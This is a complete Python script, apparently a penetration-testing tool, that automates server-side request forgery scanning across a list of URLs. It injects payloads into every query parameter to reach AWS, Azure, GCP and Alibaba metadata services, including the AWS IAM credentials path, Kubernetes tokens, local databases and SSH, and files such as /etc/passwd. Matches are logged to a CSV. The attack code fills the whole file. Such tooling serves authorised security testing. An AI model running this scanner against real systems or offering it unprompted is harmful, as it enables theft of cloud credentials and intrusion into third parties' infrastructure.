import requests
import argparse
import concurrent.futures
from urllib.parse import urlparse, parse_qs, urlencode
import threading
import csv
import sys
from colorama import Fore, Style, init
import re

# Initialize colorama for colored console output
init(autoreset=True)

# Suppress only the single InsecureRequestWarning from urllib3 needed.
from urllib3.exceptions import InsecureRequestWarning
import urllib3
urllib3.disable_warnings(InsecureRequestWarning)

# Define SSRF payloads with their corresponding grep keywords or regex patterns
ssrf_payloads_with_keywords = [
    # AWS Metadata Service
    {
        "payload": "http://169.254.169.254/latest/meta-data/",
        "keywords": [r"ami-id", r"instance-id", r"public-keys", r"local-ipv4", r"public-ipv4", r"meta-data"]
    },
    {
        "payload": "http://169.254.169.254/latest/user-data/",
        "keywords": [r"instance-id", r"user-data", r"local-ipv4"]
    },
    {
        "payload": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "keywords": [r"role", r"accessKeyId", r"secretAccessKey"]
    },
    
    # Azure Metadata Service
    {
        "payload": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "keywords": [r"compute", r"subscriptionId", r"vmId", r"tenantId"],
        "headers": {"Metadata": "true"}
    },
    
    # Google Cloud Metadata Service
    {
        "payload": "http://metadata.google.internal/computeMetadata/v1/",
        "keywords": [r"metadata", r"computeMetadata", r"Google"],
        "headers": {"Metadata-Flavor": "Google"}
    },
    
    # Alibaba Cloud Metadata Service
    {
        "payload": "http://100.100.100.200/latest/meta-data/",
        "keywords": [r"InstanceId", r"PrivateIpAddress", r"PublicIpAddress"]
    },
    
    # Localhost and Internal Services
    {
        "payload": "http://localhost:80/",
        "keywords": [r"HTTP/1\.1 200 OK", r"localhost"]
    },
    {
        "payload": "http://127.0.0.1/",
        "keywords": [r"127\.0\.0\.1", r"localhost"]
    },
    {
        "payload": "http://[::1]/",
        "keywords": [r"localhost"]
    },
    {
        "payload": "http://192.168.1.1/",
        "keywords": [r"192\.168\.1\.1", r"router", r"admin"]
    },
    {
        "payload": "http://internal-server.local/",
        "keywords": [r"internal", r"HTTP/1\.1 200 OK"]
    },
    
    # FTP Service
    {
        "payload": "ftp://127.0.0.1:21/",
        "keywords": [r"ftp", r"220", r"331 User"]
    },
    
    # File Protocol
    {
        "payload": "file:///etc/passwd",
        "keywords": [r"root:x:0:0", r"/bin/bash", r"/bin/sh", r"nologin"]
    },
    
    # SMB Service
    {
        "payload": "smb://127.0.0.1/share",
        "keywords": [r"smb", r"445", r"NetBIOS", r"server share"]
    },
    
    # Additional Internal Services
    {
        "payload": "http://localhost:6379/",
        "keywords": [r"redis_version", r"running", r"redis-cli"]
    },
    {
        "payload": "http://localhost:11211/",
        "keywords": [r"VERSION", r"STAT", r"END"]
    },
    {
        "payload": "http://localhost:27017/",
        "keywords": [r"MongoDB", r"db version", r"connections"]
    },
    {
        "payload": "http://localhost:5432/",
        "keywords": [r"PostgreSQL", r"version", r"Connection authorized"]
    },
    {
        "payload": "http://localhost:8080/",
        "keywords": [r"Welcome", r"Dashboard", r"API"]
    },
    {
        "payload": "http://localhost:3306/",
        "keywords": [r"MySQL", r"version", r"Protocol"]
    },
    {
        "payload": "http://localhost:22/",
        "keywords": [r"SSH", r"OpenSSH"]
    },
    {
        "payload": "http://localhost:25/",
        "keywords": [r"220", r"SMTP", r"ESMTP"]
    },
    {
        "payload": "http://localhost:53/",
        "keywords": [r"DNS", r"Server", r"Response"]
    },
    {
        "payload": "smtp://localhost:25/",
        "keywords": [r"220", r"SMTP", r"ESMTP"]
    },
    
    # Additional OS Files
    {
        "payload": "file:///C:/Windows/System32/drivers/etc/hosts",
        "keywords": [r"127\.0\.0\.1", r"localhost"]
    },
    {
        "payload": "file:///C:/Windows/win.ini",
        "keywords": [r"\[fonts\]", r"signature"]
    },
    {
        "payload": "file:///var/log/syslog",
        "keywords": [r"syslog", r"error", r"warning"]
    },
    {
        "payload": "file:///proc/version",
        "keywords": [r"Linux", r"version", r"gcc"]
    },
    
    # Kubernetes Service
    {
        "payload": "http://kubernetes.default.svc.cluster.local/",
        "keywords": [r"serviceaccount", r"namespace", r"token"]
    },
    
    # Redis Sentinel
    {
        "payload": "http://localhost:26379/",
        "keywords": [r"Redis Sentinel", r"role", r"monitor"]
    },
]

# Initialize a lock for thread-safe operations
file_lock = threading.Lock()

def compile_patterns(keywords):
    """
    Compile a list of regex patterns for efficient matching.
    Escapes patterns if they are invalid regex.
    """
    compiled = []
    for kw in keywords:
        try:
            compiled.append(re.compile(kw))
        except re.error:
            # If the pattern is invalid, treat it as a plain string
            compiled.append(re.compile(re.escape(kw)))
    return compiled

# Pre-compile all regex patterns for efficiency
for payload_entry in ssrf_payloads_with_keywords:
    keywords = payload_entry["keywords"]
    payload_entry["compiled_keywords"] = compile_patterns(keywords)

def grep_response(response_text, compiled_keywords):
    """
    Search for any compiled regex patterns in the response text.
    Returns the matched pattern or "No match" if none found.
    """
    for pattern in compiled_keywords:
        if pattern.search(response_text):
            return pattern.pattern
    return "No match"

def send_request(session, url, param, payload, compiled_keywords, headers=None):
    """
    Inject the payload into the specified parameter and send the HTTP request.
    Returns the new URL and the result of keyword matching.
    """
    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)

    # Replace the target parameter with the SSRF payload
    query_params[param] = payload
    new_query = urlencode(query_params, doseq=True)
    new_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query}"

    try:
        response = session.get(new_url, timeout=10, verify=False, headers=headers)
        keyword_found = grep_response(response.text, compiled_keywords)
        return (new_url, keyword_found)
    except requests.RequestException as e:
        return (new_url, f"Error: {e}")

def process_url(session, url, ssrf_payloads, results):
    """
    Process a single URL by injecting all SSRF payloads into its parameters.
    Appends matched results or errors to the results list.
    """
    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)

    # Skip URLs without query parameters
    if not query_params:
        return

    # Iterate over each query parameter
    for param in query_params:
        # Iterate over each SSRF payload
        for payload_entry in ssrf_payloads:
            payload = payload_entry["payload"]
            compiled_keywords = payload_entry["compiled_keywords"]
            headers = payload_entry.get("headers", {})
            full_url, result = send_request(session, url, param, payload, compiled_keywords, headers=headers)
            
            # Determine if the result is a match or an error
            is_match = False
            detected_keyword = ""
            if result not in ["No match"] and not result.startswith("Error"):
                is_match = True
                detected_keyword = result
            elif result.startswith("Error"):
                is_match = True  # Errors are considered matches for logging purposes

            if is_match:
                with file_lock:
                    # Extract the payload used from the new_url
                    parsed_new_url = urlparse(full_url)
                    new_query_params = parse_qs(parsed_new_url.query)
                    used_payload = new_query_params.get(param, [''])[0]

                    # Append only matched results or errors
                    results.append({
                        "Full URL": full_url,
                        "Keyword Detected": detected_keyword,
                        "Param": param,
                        "Payload": used_payload,
                        "Result": result
                    })

            # Determine color based on the result
            if is_match and detected_keyword:
                color = Fore.GREEN
                status = "Found"
            elif is_match and result.startswith("Error"):
                color = Fore.YELLOW
                status = "Error"
            else:
                color = Fore.RED
                status = "Not Found"

            # Print the detailed colored output
            print(f"{color}[{status}] URL: {full_url}")
            if detected_keyword:
                print(f"{color}Keyword Detected: {detected_keyword}")
            elif result.startswith("Error"):
                print(f"{Fore.YELLOW}Error: {result}")
            print(f"Parameter: {param}")
            print(f"Payload Used: {payload}")
            print("-" * 80)

def worker(urls, ssrf_payloads, results):
    """
    Worker function for each thread to process a list of URLs.
    """
    with requests.Session() as session:
        # Customize session headers if needed
        session.headers.update({'User-Agent': 'Mozilla/5.0 (SSRF Tester)'})
        for url in urls:
            url = url.strip()
            if url:
                process_url(session, url, ssrf_payloads, results)

def main():
    """
    Main function to parse arguments, initiate multithreading, and handle output.
    """
    parser = argparse.ArgumentParser(description="SSRF Automation Tool")
    parser.add_argument('-i', '--input', required=True, help="Input file containing URLs")
    parser.add_argument('-o', '--output', required=True, help="Output CSV file to store results")
    parser.add_argument('-t', '--threads', type=int, default=10, help="Number of threads (optional)")

    args = parser.parse_args()

    # Read URLs from input file
    try:
        with open(args.input, 'r') as f:
            urls = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"{Fore.RED}Input file '{args.input}' not found.")
        sys.exit(1)

    total_urls = len(urls)
    print(f"Total URLs to process: {total_urls}")
    if total_urls == 0:
        print(f"{Fore.YELLOW}No URLs to process.")
        sys.exit(0)

    # Prepare for multithreading
    thread_count = min(args.threads, total_urls)
    chunk_size = (total_urls + thread_count - 1) // thread_count
    url_chunks = [urls[i*chunk_size:(i+1)*chunk_size] for i in range(thread_count)]

    # Shared list to collect results
    results = []

    # Using ThreadPoolExecutor for better thread management
    with concurrent.futures.ThreadPoolExecutor(max_workers=thread_count) as executor:
        futures = []
        for chunk in url_chunks:
            futures.append(executor.submit(worker, chunk, ssrf_payloads_with_keywords, results))

        # Optional: Display progress or handle completed futures
        for future in concurrent.futures.as_completed(futures):
            try:
                future.result()
            except Exception as e:
                print(f"{Fore.YELLOW}An error occurred in a thread: {e}")

    # Write only matched results to the output CSV file
    with file_lock:
        try:
            with open(args.output, 'w', newline='', encoding='utf-8') as csvfile:
                fieldnames = ["Full URL", "Keyword Detected", "Param", "Payload", "Result"]
                writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
                writer.writeheader()
                for entry in results:
                    writer.writerow(entry)
            print(f"\n{Fore.CYAN}Results have been written to '{args.output}'.")
        except IOError as e:
            print(f"{Fore.RED}Failed to write to output file '{args.output}': {e}")
            sys.exit(1)

if __name__ == "__main__":
    main()
